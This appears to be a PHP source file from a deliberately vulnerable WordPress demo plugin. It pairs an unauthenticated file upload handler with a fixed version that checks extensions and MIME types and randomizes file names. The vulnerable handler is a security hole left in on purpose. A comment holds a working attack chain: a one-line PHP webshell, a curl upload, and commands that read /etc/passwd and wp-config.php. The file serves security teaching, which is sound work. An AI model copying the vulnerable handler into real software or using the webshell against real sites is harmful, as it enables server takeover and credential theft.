<?php
/**
 * Unrestricted File Upload Demo
 *
 * VULNERABILITY: No file type validation — allows uploading .php webshells
 * FIX: Whitelist allowed extensions, verify MIME type, randomize filenames
 */

class Vuln_File_Upload_Demo {

    const UPLOAD_SUBDIR = 'vuln-demo';

    public function __construct() {
        // Vulnerable upload — no restrictions
        add_action( 'wp_ajax_vuln_upload', [ $this, 'vulnerable_upload' ] );
        add_action( 'wp_ajax_nopriv_vuln_upload', [ $this, 'vulnerable_upload' ] );

        // Fixed upload — proper validation
        add_action( 'wp_ajax_vuln_upload_fixed', [ $this, 'fixed_upload' ] );
        add_action( 'wp_ajax_nopriv_vuln_upload_fixed', [ $this, 'fixed_upload' ] );
    }

    /**
     * VULNERABLE: Unrestricted file upload — no type checking at all
     *
     * Attack examples:
     *   echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
     *   curl -F 'file=@/tmp/shell.php' 'http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_upload'
     *   curl 'http://localhost:8080/wp-content/uploads/vuln-demo/shell.php?cmd=id'
     *   curl 'http://localhost:8080/wp-content/uploads/vuln-demo/shell.php?cmd=cat+/etc/passwd'
     *   curl 'http://localhost:8080/wp-content/uploads/vuln-demo/shell.php?cmd=cat+/var/www/html/wp-config.php'
     */
    public function vulnerable_upload() {
        if ( empty( $_FILES['file'] ) ) {
            wp_send_json_error( 'No file uploaded. Usage: curl -F "file=@shell.php" URL?action=vuln_upload' );
        }

        $file = $_FILES['file'];

        // VULNERABILITY: No file type validation — accepts anything, including .php
        $upload_dir = wp_upload_dir();
        $target_dir = $upload_dir['basedir'] . '/' . self::UPLOAD_SUBDIR;

        if ( ! file_exists( $target_dir ) ) {
            wp_mkdir_p( $target_dir );
        }

        // VULNERABILITY: Uses original filename — attacker controls it
        $target_file = $target_dir . '/' . basename( $file['name'] );
        $target_url  = $upload_dir['baseurl'] . '/' . self::UPLOAD_SUBDIR . '/' . basename( $file['name'] );

        if ( move_uploaded_file( $file['tmp_name'], $target_file ) ) {
            wp_send_json_success( [
                'message'       => 'File uploaded successfully',
                'filename'      => basename( $file['name'] ),
                'url'           => $target_url,
                'path'          => $target_file,
                'vulnerability' => 'Unrestricted File Upload - no type validation, original filename preserved, PHP execution possible',
            ] );
        }

        wp_send_json_error( 'Upload failed' );
    }

    /**
     * FIXED: Validates file type, checks MIME, randomizes filename
     */
    public function fixed_upload() {
        if ( empty( $_FILES['file'] ) ) {
            wp_send_json_error( 'No file uploaded' );
        }

        $file = $_FILES['file'];

        // FIXED 1: Whitelist allowed extensions
        $allowed_extensions = [ 'jpg', 'jpeg', 'png', 'gif', 'pdf', 'doc', 'docx' ];
        $file_ext = strtolower( pathinfo( $file['name'], PATHINFO_EXTENSION ) );

        if ( ! in_array( $file_ext, $allowed_extensions, true ) ) {
            wp_send_json_error( [
                'message'  => "File type .{$file_ext} is not allowed",
                'allowed'  => implode( ', ', $allowed_extensions ),
                'security' => 'Extension whitelist enforced',
            ] );
        }

        // FIXED 2: Verify MIME type matches extension
        $allowed_mimes = [
            'jpg'  => 'image/jpeg',
            'jpeg' => 'image/jpeg',
            'png'  => 'image/png',
            'gif'  => 'image/gif',
            'pdf'  => 'application/pdf',
            'doc'  => 'application/msword',
            'docx' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        ];

        $finfo     = new finfo( FILEINFO_MIME_TYPE );
        $real_mime = $finfo->file( $file['tmp_name'] );

        if ( $real_mime !== $allowed_mimes[ $file_ext ] ) {
            wp_send_json_error( [
                'message'  => 'MIME type mismatch — file content does not match extension',
                'detected' => $real_mime,
                'expected' => $allowed_mimes[ $file_ext ],
                'security' => 'MIME type verification prevents extension spoofing',
            ] );
        }

        // FIXED 3: Randomize filename to prevent path traversal and overwrites
        $safe_name  = wp_generate_uuid4() . '.' . $file_ext;
        $upload_dir = wp_upload_dir();
        $target_dir = $upload_dir['basedir'] . '/' . self::UPLOAD_SUBDIR;

        if ( ! file_exists( $target_dir ) ) {
            wp_mkdir_p( $target_dir );
        }

        $target_file = $target_dir . '/' . $safe_name;
        $target_url  = $upload_dir['baseurl'] . '/' . self::UPLOAD_SUBDIR . '/' . $safe_name;

        if ( move_uploaded_file( $file['tmp_name'], $target_file ) ) {
            wp_send_json_success( [
                'message'  => 'File uploaded securely',
                'filename' => $safe_name,
                'url'      => $target_url,
                'security' => 'Extension whitelist + MIME verification + randomized filename',
            ] );
        }

        wp_send_json_error( 'Upload failed' );
    }
}
